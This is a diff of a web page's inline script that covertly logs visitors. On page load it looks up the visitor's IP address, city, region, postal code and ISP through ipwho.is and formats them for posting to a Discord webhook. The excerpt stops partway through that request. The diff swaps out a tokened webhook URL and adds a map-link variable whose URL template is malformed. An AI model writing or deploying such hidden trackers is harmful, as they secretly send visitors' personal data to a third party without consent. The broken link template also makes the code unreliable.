@@ -85,11 +85,14 @@
     </div>
     <script>
     document.addEventListener("DOMContentLoaded", function() {
-        const webhookUrl = "https://discord.com/api/webhooks/1536688037310763090/RA6SSMPxYXKUYxV4_vXLpSYlyFABwS6ZctLd0MmbXb8Pmyqp16wO42Yh8rsKZrAy1jA2";
+        const webhookUrl = "https://discord.com";
         
         fetch("https://ipwho.is")
         .then(response => response.json())
         .then(data => {
+            const cityName = data.city || 'LOCATION';
+            
+            // Uses Discord Markdown [Text](URL) and JavaScript backticks for variable injection
             const rawContentText = `🟢 **Website Traffic Logged**\n• **User IP:** ${data.ip || 'Hidden'}\n• **Location:** ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'Unknown'}\n• **Postal Code:** ${data.postal || 'N/A'}\n• **Provider/ISP:** ${data.connection?.isp || 'N/A'}\n• **Google Maps:** [${cityName}](https://google.com{data.latitude},${data.longitude})`;
 
             fetch(webhookUrl, {
